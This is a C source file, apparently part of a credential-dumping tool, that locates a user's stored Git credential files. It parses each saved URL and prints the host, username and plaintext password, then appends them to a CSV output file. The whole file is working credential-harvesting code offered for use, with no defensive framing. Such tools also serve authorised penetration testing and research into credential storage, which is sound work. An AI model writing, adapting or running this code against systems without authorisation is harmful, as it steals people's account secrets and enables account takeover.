//
// Created by silentvoid on 4/13/20.
// Copyright (c) 2020 SilentVoid. All rights reserved.
//

#include "git.h"
#include "main.h"
#include "yuarel.h"

#include "log.h"

int parse_git_credentials(char *path, const char *output_file) {
    FILE *cred_fd;
    cred_fd = fopen(path, "r");
    if(cred_fd == NULL) {
        log_error("Couldn't open Git credentials file");
        return -1;
    }

    FILE *output_fd = NULL;
    if(output_file != NULL)
        output_fd = fopen(output_file, "ab");

    char line[200];
    struct yuarel url;
    while(fgets(line, 200, cred_fd)) {
        if(yuarel_parse(&url, line) == -1) {
            log_error("Error parsing git credential");
            continue;
        }

        // Fixing newline problem
        size_t len_host = strlen(url.host);
        if(url.host[len_host-1] == '\n') {
            url.host[len_host-1] = '\0';
        }

        log_success("Scheme : %s", url.scheme);
        log_success("Host : %s", url.host);
        log_success("Username : %s", url.username);
        log_success("Password : %s", url.password);
        printf("\n");

        if(output_file != NULL)
            fprintf(output_fd, "\"%s\",\"%s\",\"%s\"\n", url.host, url.username, url.password);
    }
    fclose(cred_fd);

    if(output_file != NULL)
        fclose(output_fd);

    return 1;
}

int dump_git(const char *output_file) {
    log_info("Starting Git dump ...\n");

    char git_root_path[MAX_PATH_SIZE];
    char git_config_path[MAX_PATH_SIZE];
    char git_xdg_path[MAX_PATH_SIZE];

    load_git_paths(git_root_path, git_config_path, git_xdg_path);

    int result = 0;

    if(access(git_root_path, 0) != -1) {
        result = parse_git_credentials(git_root_path, output_file);
    }

    if(access(git_config_path, 0) != -1) {
        result = parse_git_credentials(git_config_path, output_file);
    }

    if(result == 0) {
        log_error("Couldn't find any Git credentials");
        return -1;
    }
    else if (result == -1) {
        log_error("An error occured");
        return -1;
    }

    return 1;
}

